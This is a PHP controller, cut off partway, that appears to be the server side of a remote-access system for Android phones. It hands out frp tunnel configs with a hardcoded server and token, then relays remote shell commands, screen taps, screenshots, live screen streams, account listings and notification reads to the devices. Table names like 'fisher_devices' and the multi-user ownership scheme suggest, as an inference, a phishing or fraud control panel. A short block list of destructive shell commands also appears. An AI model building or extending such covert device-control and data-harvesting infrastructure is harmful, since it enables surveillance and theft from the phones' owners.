<?php
namespace app\controller;

use app\BaseController;
use think\facade\Db;
use think\facade\Request;

class TunnelController extends BaseController
{
    private const RECOVERY_PORT_OFFSET = 30000;
    /**
     * GET /api/tunnel/config
     * local-service 获取 frpc 隧道配置
     * 
     * Go 响应结构体:
     *   code=0, success=true, data.configINI = frpc INI 字符串
     */
    public function config()
    {
        if (Request::isPost()) {
            return $this->updateConfig();
        }

        $deviceId = Request::get('deviceId', '') ?: Request::header('X-Device-ID', '');

        // ★ 改进：彻底去掉 19901 跳板依赖
        //   - 有 deviceId → 直接分配/查独立端口（推荐方案）
        //   - 没 deviceId → 拒绝（防止新设备走 19901 跳板造成串设备）
        if (empty($deviceId)) {
            return json([
                'success' => false,
                'code'    => 400,
                'message' => 'deviceId required',
            ]);
        }
        if (self::isDeviceDeleted((string)$deviceId)) {
            return json([
                'success' => false,
                'code'    => 410,
                'message' => 'device deleted',
            ], 410);
        }
        $remotePort = $this->getOrAllocateRemotePort($deviceId);
        $localServicePort = (int)env('frps.local_service_port', 7912);
        $token = env('frps.frps_token') ?: env('FRPS.FRPS_TOKEN', '');
        if (empty($token)) {
            throw new \RuntimeException('FRPS_TOKEN 未配置，请在 .env 中设置 [FRPS] FRPS_TOKEN');
        }

        // ★ 关键修复：$serverAddr / $serverPort 之前未定义，导致 configINI 空值
        //   优先级：DB fisher_settings.sys_frps_addr → .env FRPS_ADDR → 硬编码公网IP
        $serverAddr = env('frps.server_addr', '') ?: env('FRPS.FRPS_ADDR', '');
        if (empty($serverAddr)) {
            try {
                $row = Db::table('fisher_settings')->where('key', 'sys_frps_addr')->find();
                if ($row && !empty($row['value'])) $serverAddr = $row['value'];
            } catch (\Exception $e) {}
        }
        if (empty($serverAddr)) $serverAddr = '154.94.224.239';

        $serverPort = (int)(env('frps.server_port', '') ?: env('FRPS.FRPS_PORT', 7000));
        if ($serverPort <= 0) $serverPort = 7000;

        // ★ 关键修复3：configINI 必须是 INI 格式（与 Node-WS 旧版兼容，Go直接写frpc_independent.ini）
        //   根因1(已修)：之前写成 TOML(serverAddr / [[proxies]])→frpc解析失败不启动
        //   根因2(已修)：/api/sync/app-list之前白名单+路由都缺→APK初始化中断永不调config
        //   根因3(现修)：之前抄了Node-WS的admin_addr/admin_port=7400，但7400是FRPS vhostHTTPPort LISTEN占用
        //           →frpc启动想bind 127.0.0.1:7400→Exit 1→FRPS零注册！100%复现Exit 1=本机实锤
        $proxyName = 'tunnel_' . substr($deviceId, 0, 8);
        $configINI = "[common]\n"
            . "server_addr = {$serverAddr}\n"
            . "server_port = {$serverPort}\n"
            . "token = {$token}\n"
            . "\n"
            . "[{$proxyName}]\n"
            . "type = tcp\n"
            . "local_ip = 127.0.0.1\n"
            . "local_port = {$localServicePort}\n"
            . "remote_port = {$remotePort}\n";

        // ★ JSON 结构 1:1 对齐 Node-WS index.js L948-966（避免 Go 解析字段错位）
        return json([
            'success'    => true,
            'frpsAddr'   => $serverAddr,
            'frpsPort'   => $serverPort,
            'frpsToken'  => $token,
            'remotePort' => $remotePort,
            'code'       => 0,
            'data'       => [
                'frpsAddr'   => $serverAddr,
                'frpsPort'   => $serverPort,
                'frpsToken'  => $token,
                'serverAddr' => $serverAddr,
                'serverPort' => $serverPort,
                'token'      => $token,
                'remotePort' => $remotePort,
                'localPort'  => $localServicePort,
                'configINI'  => $configINI,
            ],
            // 冗余字段（Go 代码可能从顶级读，也可能从 data 读，双保险）
            'serverAddr' => $serverAddr,
            'serverPort' => $serverPort,
            'token'      => $token,
            'localPort'  => $localServicePort,
            'configINI'  => $configINI,
        ]);
    }

    /**
     * 获取或分配设备的 remote_port
     * 端口范围: 19900-19999
     */
    private function getOrAllocateRemotePort($deviceId)
    {
        if (empty($deviceId)) {
            throw new \RuntimeException('deviceId required for port allocation');
        }

        try {
            // 1. 先查设备是否已分配端口（无锁快速路径）
            $device = Db::table('fisher_devices')
                ->where('device_id', $deviceId)
                ->field('remote_port')
                ->find();

            if ($device && !empty($device['remote_port']) && (int)$device['remote_port'] >= 19902) {
                return (int)$device['remote_port'];
            }

            // 2. 分配新端口：使用事务 + 行锁防止并发冲突
            $conn = \think\facade\Db::connect();
            $conn->startTrans();
            try {
                $maxPort = \think\facade\Db::table('fisher_devices')
                    ->where('remote_port', '>=', 19902)
                    ->where('remote_port', '<=', 29999)
                    ->order('remote_port', 'desc')
                    ->lock(true)
                    ->value('remote_port');

                $newPort = $maxPort ? (int)$maxPort + 1 : 19902;

                // 跳过 19901 跳板（专用），从 19902 起
                if ($newPort < 19902) {
                    $newPort = 19902;
                }

                // 循环找下一个空闲端口（防止端口被野 frpc 占用）
                $maxAttempts = 100;
                $attempt = 0;
                while ($attempt < $maxAttempts && $newPort <= 29999) {
                    $occupied = \think\facade\Db::table('fisher_devices')
                        ->where('remote_port', $newPort)
                        ->where('device_id', '<>', $deviceId)
                        ->count();
                    if ($occupied == 0) {
                        break;
                    }
                    $newPort++;
                    $attempt++;
                }

                if ($newPort > 29999) {
                    throw new \RuntimeException('No available ports (19902-29999 all occupied)');
                }

                // 保存到设备记录
                \think\facade\Db::table('fisher_devices')
                    ->where('device_id', $deviceId)
                    ->update(['remote_port' => $newPort, 'tunnel_deployed' => 1]);

                $conn->commit();
                return $newPort;
            } catch (\Exception $e) {
                $conn->rollback();
                throw $e;
            }
        } catch (\Exception $e) {
            // 出错时 fallback 19902（不再用 19901 跳板）
            return 19902;
        }
    }

    /**
     * POST /api/tunnel/config
     * 更新隧道配置
     */
    public function updateConfig()
    {
        $data = Request::post();
        // 存储到 settings 表
        if (isset($data['frpsAddr'])) {
            Db::table('fisher_settings')->replace(['key' => 'frps_addr', 'value' => $data['frpsAddr']]);
        }
        if (isset($data['frpsPort'])) {
            Db::table('fisher_settings')->replace(['key' => 'frps_port', 'value' => (string)$data['frpsPort']]);
        }

        // ★ 修复 BUG#5：PHP 进程内 env() 是启动时缓存的，DB 更新不会立即生效
        // 改为：读 DB 最新值，回写 .env 文件，让 PHP 重启后也能拿到最新值
        $this->refreshFrpsConfigFromDb();

        return json(['success' => true, 'data' => null, 'message' => 'success']);
    }

    /**
     * 从 DB 刷新 frps 配置到 .env 文件
     * 解决：ThinkPHP env() 单启动周期缓存，更新 DB 后下次重启生效
     * 兼容两种 .env 格式：
     *   1. ThinkPHP section 格式：[FRPS] SERVER_ADDR = xxx / SERVER_PORT = xxx
     *   2. 顶层键格式：FRPS_ADDR = xxx / FRPS_PORT = xxx
     */
    private function refreshFrpsConfigFromDb()
    {
        try {
            $addrRow = Db::table('fisher_settings')->where('key', 'frps_addr')->find();
            $portRow = Db::table('fisher_settings')->where('key', 'frps_port')->find();
            if (!$addrRow && !$portRow) {
                return;
            }

            $envFile = root_path() . '.env';
            if (!is_file($envFile) || !is_writable($envFile)) {
                return;
            }
            $envContent = file_get_contents($envFile);

            $newAddr = $addrRow ? $addrRow['value'] : null;
            $newPort = $portRow ? (int)$portRow['value'] : null;

            // --- 替换 ThinkPHP section 格式 [FRPS] 下的键 ---
            if ($newAddr !== null) {
                $envContent = preg_replace_callback(
                    '/^(\s*SERVER_ADDR\s*=\s*)(.*)$/mi',
                    function ($m) use ($newAddr) {
                        // 只有在 [FRPS] section 内的才替换
                        // 简化处理：直接替换所有 SERVER_ADDR（非 section 下一般不用于 FRPS）
                        return $m[1] . $newAddr;
                    },
                    $envContent,
                    1
                );
                // 也尝试替换 section 内 SERVER_ADDR 的写法（可能上面已匹配，不影响）
                $envContent = preg_replace(
                    '/^FRPS_ADDR\s*=\s*.*$/m',
                    'FRPS_ADDR = ' . $newAddr,
                    $envContent,
                    1
                );
            }
            if ($newPort !== null) {
                $envContent = preg_replace_callback(
                    '/^(\s*SERVER_PORT\s*=\s*)(.*)$/mi',
                    function ($m) use ($newPort) {
                        return $m[1] . $newPort;
                    },
                    $envContent,
                    1
                );
                $envContent = preg_replace(
                    '/^FRPS_PORT\s*=\s*.*$/m',
                    'FRPS_PORT = ' . $newPort,
                    $envContent,
                    1
                );
            }

            // --- 确保 [FRPS] section 存在且包含所需键 ---
            $hasFrpsSection = (bool)preg_match('/^\s*\[FRPS\]\s*$/mi', $envContent);

            if (!$hasFrpsSection) {
                // 追加 [FRPS] section
                $sectionBlock = PHP_EOL . '[FRPS]' . PHP_EOL;
                if ($newAddr !== null) $sectionBlock .= 'SERVER_ADDR = ' . $newAddr . PHP_EOL;
                if ($newPort !== null) $sectionBlock .= 'SERVER_PORT = ' . $newPort . PHP_EOL;
                $sectionBlock .= 'TOKEN = ' . PHP_EOL;
                $envContent .= $sectionBlock;
            } else {
                // section 存在时，确保两个键在 [FRPS] 之后有定义（上面已替换过，但若键缺失则补齐）
                if ($newAddr !== null && !preg_match('/^\[FRPS\][\s\S]*?^\s*SERVER_ADDR\s*=/mi', $envContent)) {
                    $envContent = preg_replace(
                        '/^(\s*\[FRPS\]\s*)$/mi',
                        '$1' . PHP_EOL . 'SERVER_ADDR = ' . $newAddr,
                        $envContent,
                        1
                    );
                }
                if ($newPort !== null && !preg_match('/^\[FRPS\][\s\S]*?^\s*SERVER_PORT\s*=/mi', $envContent)) {
                    $envContent = preg_replace_callback(
                        '/^(\[FRPS\][\s\S]*?)(^\s*\[|\z)/mi',
                        function ($m) use ($newPort) {
                            $before = rtrim($m[1]);
                            return $before . PHP_EOL . 'SERVER_PORT = ' . $newPort . PHP_EOL . $m[2];
                        },
                        $envContent,
                        1
                    );
                }
            }

            // 最后兜底：再次强制替换顶层 FRPS_ADDR / FRPS_PORT（防止某些部署只认顶层）
            if ($newAddr !== null) {
                if (preg_match('/^FRPS_ADDR\s*=/m', $envContent)) {
                    $envContent = preg_replace('/^FRPS_ADDR\s*=.*$/m', 'FRPS_ADDR = ' . $newAddr, $envContent, 1);
                } else {
                    $envContent = rtrim($envContent) . PHP_EOL . 'FRPS_ADDR = ' . $newAddr . PHP_EOL;
                }
            }
            if ($newPort !== null) {
                if (preg_match('/^FRPS_PORT\s*=/m', $envContent)) {
                    $envContent = preg_replace('/^FRPS_PORT\s*=.*$/m', 'FRPS_PORT = ' . $newPort, $envContent, 1);
                } else {
                    $envContent = rtrim($envContent) . PHP_EOL . 'FRPS_PORT = ' . $newPort . PHP_EOL;
                }
            }

            file_put_contents($envFile, $envContent);
        } catch (\Exception $e) {
            // 静默失败：DB 已更新，下次重启自然生效
        }
    }

    /**
     * GET /api/tunnel/status
     * 隧道状态
     */
    public function status()
    {
        return json(['success' => true, 'data' => ['deployed' => true], 'message' => 'success']);
    }

    /**
     * GET|POST /api/tunnel/deploy
     * 标记隧道已部署（APK local-service 回调）
     */
    public function deployed()
    {
        $deviceId = Request::param('deviceId', '') ?: Request::header('X-Device-ID', '');

        if (!empty($deviceId)) {
            try {
                Db::table('fisher_devices')
                    ->where('device_id', $deviceId)
                    ->update(['tunnel_deployed' => 1]);
            } catch (\Exception $e) {
                // 字段可能不存在，忽略
            }
        }

        return json(['success' => true, 'data' => ['deployed' => true], 'message' => 'success']);
    }

    /**
     * POST /api/tunnel/refresh-frps-env
     * 手动触发从 DB 刷新 FRPS 配置到 .env 文件
     */
    public function refreshFrpsEnv()
    {
        $this->refreshFrpsConfigFromDb();
        return json(['success' => true, 'message' => '.env FRPS 配置已从 DB 刷新']);
    }

    // ================================================================
    // 以下接口从 Node.js index.js 迁移过来（2026-08-05）
    // 原因：Node 主职责是 WS，这些纯 HTTP 代理接口放在 PHP 更稳定
    // ================================================================

    /**
     * POST /api/tunnel/shell
     * 通过隧道在设备上执行 shell 命令（代理到 local-service /execShell）
     */
    public function shell()
    {
        $cmd = Request::post('cmd', '');
        $deviceId = Request::post('deviceId', '');

        if (empty($cmd)) {
            return json(['success' => false, 'error' => 'cmd required'], 400);
        }

        if (preg_match('/\b(rm\s+-rf|mkfs|dd\s+if=|format\s+|fdisk|parted)\b/i', $cmd)) {
            return json(['success' => false, 'error' => 'Forbidden: dangerous command blocked'], 403);
        }

        $device = $this->loadDeviceForTunnel($deviceId);
        if ($device === null) return json(['success' => false, 'error' => 'Device not found'], 404);

        $port = (int)($device['remote_port'] ?? 0);
        if ($port <= 0) $port = 19901;
        if ($port === 19901) {
            return json(['success' => false, 'error' => '设备隧道尚未初始化，请等待设备上报配置或调用 /tunnel/bootstrap'], 503);
        }

        $result = $this->proxyToLocalService($port, '/execShell', 'POST', json_encode(['command' => $cmd]), 20, $deviceId);
        if ($result === false) {
            $result = $this->proxyToLocalService($this->getRecoveryTunnelPort($port), '/execShell', 'POST', json_encode(['command' => $cmd]), 25, $deviceId);
        }

        if ($result === false) {
            return json(['success' => false,
                'error'   => '设备 local-service 隧道代理失败（桥接可能已离线或 frpc 断连）',
                'detail'  => '详细错误见 runtime/tunnel_proxy_error.log',
            ], 503);
        }

        return response($result, 200, ['Content-Type' => 'application/json']);
    }

    /**
     * POST /api/tunnel/input
     * 代理 local-service 的触控/键事件（/tap, /swipe, /keyevent 等）
     */
    public function input()
    {
        $action = Request::post('action', '');
        $params = Request::post('params', []);
        $deviceId = Request::post('deviceId', '');

        if (empty($action)) {
            return json(['success' => false, 'error' => 'action required'], 400);
        }

        $device = $this->loadDeviceForTunnel($deviceId);
        if ($device === null) return json(['success' => false, 'error' => 'Device not found'], 404);

        $port = (int)($device['remote_port'] ?? 0);
        if ($port <= 0) $port = 19901;
        if ($port === 19901) {
            return json(['success' => false, 'error' => '设备隧道尚未初始化，请等待设备上报配置或调用 /tunnel/bootstrap'], 503);
        }

        $getActions = ['isActiveDeviceOwner', 'deviceAdmin', 'listAccounts', 'getNotifications',
                       'accessibilityState', 'screenState', 'getConfig',
                       'windowListener/status', 'windowListener/getRules'];
        $useGet = in_array($action, $getActions);
        $bodyJson = json_encode($params ?: new \stdClass());

        if ($useGet) {
            $result = $this->proxyToLocalService($port, '/' . $action, 'GET', '', 20, $deviceId);
        } else {
            $result = $this->proxyToLocalService($port, '/' . $action, 'POST', $bodyJson, 20, $deviceId);
        }
        if ($result === false) {
            $recoveryPort = $this->getRecoveryTunnelPort($port);
            if ($useGet) {
                $result = $this->proxyToLocalService($recoveryPort, '/' . $action, 'GET', '', 25, $deviceId);
            } else {
                $result = $this->proxyToLocalService($recoveryPort, '/' . $action, 'POST', $bodyJson, 25, $deviceId);
            }
        }

        if ($result === false) {
            return json(['success' => false,
                'error'  => '设备 local-service 代理失败（桥接可能已离线或 frpc 断连）',
                'detail' => '详细错误见 runtime/tunnel_proxy_error.log',
            ], 503);
        }

        return response($result, 200, ['Content-Type' => 'application/json']);
    }

    /**
     * GET /api/tunnel/screenshot
     * 代理 local-service 截图端点，返回原始 PNG
     */
    public function screenshot()
    {
        $deviceId = Request::get('deviceId', '');

        $device = $this->loadDeviceForTunnel($deviceId);
        if ($device === null) return json(['success' => false, 'error' => 'Device not found'], 404);

        $port = (int)($device['remote_port'] ?? 0);
        if ($port <= 0) $port = 19901;
        if ($port === 19901) {
            return json(['success' => false, 'error' => '设备隧道尚未初始化，请等待设备上报配置或调用 /tunnel/bootstrap'], 503);
        }

        $result = $this->proxyToLocalServiceRaw($port, '/screenshot', 'GET', '', 25, $deviceId);
        if ($result === false) {
            $result = $this->proxyToLocalServiceRaw($this->getRecoveryTunnelPort($port), '/screenshot', 'GET', '', 30, $deviceId);
        }

        if ($result === false) {
            return json(['success' => false,
                'error'  => '设备 local-service 截图代理失败（桥接可能已离线或 frpc 断连）',
                'detail' => '详细错误见 runtime/tunnel_proxy_error.log',
            ], 503);
        }

        // 判断是否为 JSON（可能返回 base64）
        if (strlen($result) > 0 && ($result[0] === '{' || $result[0] === '[')) {
            $json = json_decode($result, true);
            $b64 = $json['data']['output'] ?? $json['data'] ?? $json['screenshot'] ?? $json['base64'] ?? '';
            if (is_string($b64) && strlen($b64) > 100) {
                $imgBuf = base64_decode(preg_replace('/\s+/', '', $b64));
                return response($imgBuf, 200, [
                    'Content-Type' => 'image/png',
                    'Content-Length' => strlen($imgBuf),
                    'Cache-Control' => 'no-cache, no-store',
                ]);
            }
        }

        // 直接返回二进制 PNG
        if (strlen($result) > 100) {
            return response($result, 200, [
                'Content-Type' => 'image/png',
                'Content-Length' => strlen($result),
                'Cache-Control' => 'no-cache, no-store',
            ]);
        }

        return json(['success' => false, 'error' => 'Screenshot too small or empty'], 502);
    }

    /**
     * GET /api/tunnel/minicap-stream
     * 代理 local-service /minicap/stream 持续 MJPEG 视频流
     * 返回 multipart/x-mixed-replace 流，浏览器 <img> 标签可直接消费
     *
     * 关键点：
     * - X-Accel-Buffering: no 告知 Nginx 不要 buffer
     * - CURLOPT_WRITEFUNCTION 透传流式响应，不缓冲到内存
     * - CURLOPT_TIMEOUT=0 不超时
     */
    public function minicapStream()
    {
        $deviceId = Request::get('deviceId', '');

        // ★ 2026-09-18 安全修复：minicap-stream 在白名单里（因为 <img> 无法带 Authorization header），
        //   必须在这里手动做 JWT 校验 + 设备归属兜底，防止任何人凭 deviceId 看任意屏幕。
        //   优先级：1. GET 参数 ?token=xxx  2. Authorization: Bearer xxx（兜底）
        if ($deviceId === '') {
            header('Content-Type: application/json', true, 400);
            echo json_encode(['success' => false, 'error' => 'deviceId required']);
            exit;
        }

        $token = Request::get('token', '');
        if ($token === '') {
            $auth = Request::header('Authorization', '');
            if (str_starts_with($auth, 'Bearer ')) {
                $token = substr($auth, 7);
            }
        }
        if ($token === '') {
            header('Content-Type: application/json', true, 401);
            echo json_encode(['success' => false, 'error' => 'Token required for minicap stream']);
            exit;
        }

        // 手动验证 JWT（同 Auth 中间件逻辑）
        $secret = (string)env('JWT.JWT_SECRET', '');
        $payload = null;
        if (strlen($secret) >= 32) {
            $parts = explode('.', $token);
            if (count($parts) === 3) {
                [$h, $p, $s] = $parts;
                $expected = rtrim(strtr(base64_encode(hash_hmac('sha256', "$h.$p", $secret, true)), '+/', '-_'), '=');
                if (hash_equals($expected, $s)) {
                    $payload = json_decode(base64_decode(strtr($p, '-_', '+/')), true);
                }
            }
        }
        if (!$payload || empty($payload['user_id'])) {
            header('Content-Type: application/json', true, 401);
            echo json_encode(['success' => false, 'error' => 'Invalid token for minicap stream']);
            exit;
        }
        $dbUser = Db::table('fisher_users')->where('id', (int)$payload['user_id'])->find();
        if (!$dbUser) {
            header('Content-Type: application/json', true, 401);
            echo json_encode(['success' => false, 'error' => 'User not found']);
            exit;
        }
        if (isset($dbUser['enabled']) && !(int)$dbUser['enabled']) {
            header('Content-Type: application/json', true, 403);
            echo json_encode(['success' => false, 'error' => 'User disabled']);
            exit;
        }

        // 模拟 DeviceController::findAuthorizedDevice 的权限检查
        $actorRole = $dbUser['role'] ?? 'user';
        $isSuper = in_array($actorRole, ['superadmin', 'super-admin'], true);
        if (!$isSuper) {
            $username = trim((string)($dbUser['username'] ?? ''));
            $scope = [$username];
            if (($actorRole ?? 'user') === 'admin' && $username !== '') {
                $children = Db::table('fisher_users')->where('parent_username', $username)->column('username');
                $scope = array_values(array_unique(array_filter(array_merge($scope, $children), 'strlen')));
            }
            $authorized = Db::table('fisher_devices')
                ->where('device_id', $deviceId)
                ->whereIn('owner_username', $scope ?: ['__no_authorized_owner__'])
                ->find();
            if (!$authorized) {
                header('Content-Type: application/json', true, 403);
                echo json_encode(['success' => false, 'error' => 'Device not authorized for this user']);
                exit;
            }
        }

        $port = $this->getDeviceTunnelPort($deviceId);
        if ($port === 19901) {
            header('Content-Type: application/json', true, 503);
            echo json_encode(['success' => false, 'error' => '设备隧道尚未初始化，无法投屏']);
            exit;
        }
        if (!$this->checkPortAlive($port, 2)) {
            $recoveryPort = $this->getRecoveryTunnelPort($port);
            if ($this->checkPortAlive($recoveryPort, 3)) {
                $port = $recoveryPort;
            }
        }

        // ★ Nginx 关闭缓冲（重要！否则视频流会被 Nginx 缓冲在内存中）
        header('X-Accel-Buffering: no');
        header('Cache-Control: no-cache, no-store, must-revalidate');
        header('Pragma: no-cache');

        // ★ 忽略客户端断开
        ignore_user_abort(true);
        set_time_limit(0);
        while (ob_get_level() > 0) {
            ob_end_flush();
        }

        $ch = curl_init("http://127.0.0.1:{$port}/minicap/stream");
        curl_setopt_array($ch, [
            CURLOPT_HTTPHEADER => [
                'Authorization: Bearer ' . Request::header('Authorization', ''),
                'X-Device-ID: ' . $deviceId,
            ],
            CURLOPT_WRITEFUNCTION => function ($ch, $data) {
                // ★ 直接透传，不在 PHP 内存中缓冲
                echo $data;
                @ob_flush();
                @flush();
                return strlen($data);
            },
            CURLOPT_HEADERFUNCTION => function ($ch, $header) {
                $len = strlen($header);
                $header = trim($header);
                if ($header && stripos($header, 'Transfer-Encoding') === false) {
                    header($header, false);
                }
                return $len;
            },
            CURLOPT_TIMEOUT => 0,
            CURLOPT_CONNECTTIMEOUT => 5,
            CURLOPT_BUFFERSIZE => 8192,
            CURLOPT_NOPROGRESS => true,
            CURLOPT_FOLLOWLOCATION => true,
        ]);

        $result = curl_exec($ch);
        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        $error = curl_error($ch);
        curl_close($ch);

        if ($result === false && $httpCode !== 200) {
            if (!connection_aborted()) {
                header('Content-Type: application/json');
                echo json_encode(['success' => false, 'error' => 'Minicap stream failed', 'httpCode' => $httpCode, 'detail' => $error]);
            }
        }
        exit;
    }

    /**
     * GET /api/tunnel/bootstrap
     * 分配端口 + 通知 bridge + 轮询等待端口可达
     */
    public function bootstrap()
    {
        $deviceId = Request::get('deviceId', '');
        if (empty($deviceId)) {
            return json(['ok' => false, 'error' => 'deviceId required'], 400);
        }

        // 1. 获取或分配端口
        $port = $this->getOrAllocateRemotePort($deviceId);

        // 2. 检测端口是否已可达
        if ($this->checkPortAlive($port)) {
            return json(['ok' => true, 'status' => 'already_alive', 'remotePort' => $port]);
        }

        // 3. 通知 bridge（通过 Node WS 的 /internal/bridge-send）
        $bridgeNotifyOk = false;
        try {
            $nodeWsPort = env('node_ws.port', 8889);
            $payload = json_encode([
                'deviceId' => $deviceId,
                'message' => ['command' => 'setServerAddr', 'params' => ['serverAddr' => env('frps.server_addr', '154.94.224.239:8889')]]
            ]);
            $ch = curl_init("http://127.0.0.1:{$nodeWsPort}/internal/bridge-send");
            curl_setopt_array($ch, [
                CURLOPT_POST => true,
                CURLOPT_POSTFIELDS => $payload,
                CURLOPT_HTTPHEADER => ['Content-Type: application/json'],
                CURLOPT_RETURNTRANSFER => true,
                CURLOPT_TIMEOUT => 3,
            ]);
            $resp = curl_exec($ch);
            curl_close($ch);
            if ($resp) {
                $r = json_decode($resp, true);
                $bridgeNotifyOk = !empty($r['ok']);
            }
        } catch (\Exception $e) {
            // ignore
        }

        // 4. 轮询等待端口可达（最多 10 秒）
        $alive = false;
        for ($i = 0; $i < 10; $i++) {
            sleep(1);
            if ($this->checkPortAlive($port)) {
                $alive = true;
                break;
            }
        }

        if ($alive) {
            Db::table('fisher_devices')->where('device_id', $deviceId)->update(['tunnel_deployed' => 1]);
            return json(['ok' => true, 'status' => 'success', 'remotePort' => $port, 'bridgeNotified' => $bridgeNotifyOk]);
        }

        return json(['ok' => true, 'status' => 'pending', 'remotePort' => $port, 'bridgeNotified' => $bridgeNotifyOk,
                     'message' => '已分配端口并通知 bridge，请等待设备下次拉取 config']);
    }

    /**
     * GET|POST /api/tunnel/setDeviceId
     * 通过隧道端口向设备推送 deviceId 配置
     */
    public function setDeviceId()
    {
        $deviceId = Request::param('deviceId', '');
        if (empty($deviceId)) {
            return json(['success' => false, 'error' => 'deviceId required'], 400);
        }

        $port = $this->getDeviceTunnelPort($deviceId);
        if ($port === 19901) {
            // 即使 fallback 端口，也尝试下发（local-service 可能正通过 frps 跳板连到 19901）
        }
        $serverAddr = 'http://' . env('frps.server_addr', '154.94.224.239:8889');

        // Step 1: 调用 /setAppConfig
        $setAppConfigUrl = "/setAppConfig?deviceId=" . urlencode($deviceId) . "&serverAddr=" . urlencode($serverAddr);
        $result1 = $this->proxyToLocalService($port, $setAppConfigUrl, 'GET', '', 3, $deviceId);

        if ($result1 === false) {
            return json(['success' => false, 'error' => "setAppConfig failed on port {$port}"], 502);
        }

        // Step 2: 调用 /setServerAddr
        $setServerAddrUrl = "/setServerAddr?serverAddr=" . urlencode($serverAddr);
        $result2 = $this->proxyToLocalService($port, $setServerAddrUrl, 'GET', '', 3, $deviceId);

        // Step 3: 确保 DB 中有端口分配
        $remotePort = $this->getOrAllocateRemotePort($deviceId);

        return json([
            'success' => true,
            'message' => "deviceId={$deviceId} pushed via port {$port}. remotePort={$remotePort}",
            'setAppConfig' => ['ok' => ($result1 !== false), 'port' => $port],
            'setServerAddr' => ['ok' => ($result2 !== false)],
            'workingPort' => $port,
            'remotePort' => $remotePort,
        ]);
    }

    // ================================================================
    // 私有辅助方法
    // ================================================================

    /**
     * 获取设备的隧道端口（仅查询，不分配）
     */
    private function getDeviceTunnelPort($deviceId)
    {
        if (empty($deviceId)) return 19901;

        $device = Db::table('fisher_devices')
            ->where('device_id', $deviceId)
            ->field('remote_port')
            ->find();

        if ($device && !empty($device['remote_port']) && (int)$device['remote_port'] > 0) {
            return (int)$device['remote_port'];
        }

        return 19901; // fallback
    }

    private function getRecoveryTunnelPort($primaryPort)
    {
        $port = (int)$primaryPort + self::RECOVERY_PORT_OFFSET;
        return $port >= 1 && $port <= 65535 ? $port : 0;
    }

    /**
     * HTTP 代理到 local-service（返回响应体字符串，失败返回 false）
     * ★ 2026-09-18 关键修复：
     *   1. 增加 $deviceId 参数 + 注入 X-Device-ID / Authorization headers
     *      根因：之前只有 minicapStream() 带 header，input/screenshot/shell 不带
     *           Go local-service 的 /tap /keyevent 等方法会校验 X-Device-ID，缺 header 直接丢弃请求
     *           → curl 等满 timeout 返回 false → 前端收到 502 Bad Gateway
     *   2. 增加失败时的详细错误日志（端口、路径、HTTP 码、curl_error），方便排查 502 根因
     */
    private function proxyToLocalService($port, $path, $method = 'GET', $body = '', $timeout = 10, $deviceId = '')
    {
        $url = "http://127.0.0.1:{$port}{$path}";
        $ch = curl_init($url);

        $headers = [];
        if ($deviceId !== '') {
            $headers[] = 'X-Device-ID: ' . $deviceId;
        }
        $authHeader = Request::header('Authorization', '');
        if ($authHeader !== '') {
            $headers[] = 'Authorization: ' . $authHeader;
        }

        curl_setopt_array($ch, [
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_TIMEOUT => $timeout,
            CURLOPT_CONNECTTIMEOUT => 5,
            CURLOPT_TCP_NODELAY => 1,
            CURLOPT_TCP_KEEPALIVE => 1,
            CURLOPT_TCP_KEEPIDLE => 60,
            CURLOPT_TCP_KEEPINTVL => 10,
        ]);

        if (strtoupper($method) === 'POST') {
            curl_setopt($ch, CURLOPT_POST, true);
            curl_setopt($ch, CURLOPT_POSTFIELDS, $body);
            $headers[] = 'Content-Type: application/json';
            $headers[] = 'Content-Length: ' . strlen($body);
        }

        if (!empty($headers)) {
            curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
        }

        $result = curl_exec($ch);
        $httpCode = (int)curl_getinfo($ch, CURLINFO_HTTP_CODE);
        $error = curl_error($ch);
        curl_close($ch);

        if ($result === false || $httpCode === 0) {
            // 记录详细错误日志，方便排查 502 根因
            $errLog = [
                'time'       => date('c'),
                'deviceId'   => $deviceId,
                'port'       => (int)$port,
                'path'       => $path,
                'method'     => $method,
                'httpCode'   => $httpCode,
                'curlError'  => $error ?: 'unknown_curl_error',
                'bodySample' => substr($body, 0, 200),
            ];
            @file_put_contents(
                runtime_path() . 'tunnel_proxy_error.log',
                json_encode($errLog, JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES) . PHP_EOL,
                FILE_APPEND | LOCK_EX
            );
            return false;
        }

        return $result;
    }

    /**
     * HTTP 代理到 local-service（返回原始二进制数据）
     */
    private function proxyToLocalServiceRaw($port, $path, $method = 'GET', $body = '', $timeout = 15, $deviceId = '')
    {
        return $this->proxyToLocalService($port, $path, $method, $body, $timeout, $deviceId);
    }

    /**
     * 检测本地端口是否可达（TCP 层探测，不依赖 HTTP /health）
     * 原理：frpc 映射是 TCP 层，只要能建立 TCP 连接即认为端口"活着"
     * （不要求 Go local-service 必须响应某个特定路径）
     */
    private function checkPortAlive($port, $timeout = 2)
    {
        $port = (int)$port;
        if ($port <= 0 || $port > 65535) return false;

        $fp = @fsockopen('127.0.0.1', $port, $errno, $errstr, $timeout);
        if ($fp === false) return false;
        fclose($fp);
        return true;
    }

    /**
     * 从 fisher_devices 加载设备用于隧道操作
     * 不存在返回 null
     */
    private function loadDeviceForTunnel($deviceId)
    {
        if (empty($deviceId)) return null;

        try {
            $device = Db::table('fisher_devices')
                ->where('device_id', $deviceId)
                ->field('device_id, remote_port, last_seen, owner_username, local_service_connected, is_connected, accessibility_alive, tunnel_deployed')
                ->find();
            return $device ?: null;
        } catch (\Exception $e) {
            return null;
        }
    }

    /**
     * 隧道前置健康检查
     * 返回: [
     *   'fatal'  => bool,     // 是否致命（应该直接 503）
     *   'error'  => string,   // 致命时的错误描述
     *   'tunnel' => [ ... ]   // 返回给前端的完整状态对象
     * ]
     */
    private function preflightTunnelHealth($port, $device)
    {
        $port = (int)$port;
        $now = time();

        $lastSeen = (int)($device['last_seen'] ?? 0);
        $minutesSinceLastSeen = $lastSeen > 0 ? floor(($now - $lastSeen) / 60) : null;

        $bridgeConnected = !empty($device['local_service_connected']) || !empty($device['is_connected']);
        $portAlive = $port > 0 && $port !== 19901 ? $this->checkPortAlive($port, 1) : false;
        $recoveryPort = $this->getRecoveryTunnelPort($port);
        $recoveryPortAlive = $recoveryPort > 0 ? $this->checkPortAlive($recoveryPort, 1) : false;

        $remotePortAllocated = $port > 0 && $port !== 19901;
        $tunnelDeployed = !empty($device['tunnel_deployed']);

        $tunnel = [
            'port'                 => $port,
            'recoveryPort'         => $recoveryPort,
